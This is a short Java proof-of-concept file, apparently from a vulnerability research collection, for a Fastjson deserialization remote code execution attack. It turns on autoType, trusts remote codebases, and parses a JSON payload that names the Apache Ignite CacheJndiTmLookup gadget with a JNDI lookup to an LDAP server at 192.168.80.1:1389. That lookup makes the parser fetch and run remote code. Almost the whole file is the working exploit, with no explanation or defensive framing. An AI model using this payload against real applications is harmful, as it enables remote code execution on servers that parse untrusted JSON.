package com.ja0k.bug.fastjson.rce;
//org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * <!--        org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup-->
 *         <dependency>
 *             <groupId>org.apache.ignite</groupId>
 *             <artifactId>ignite-jta</artifactId>
 *             <version>1.1.0-incubating</version>
 *         </dependency>
 */

public class CacheJndiTmLookup {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://192.168.80.1:1389/Calc\"}";
        try {
            JSON.parseObject(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
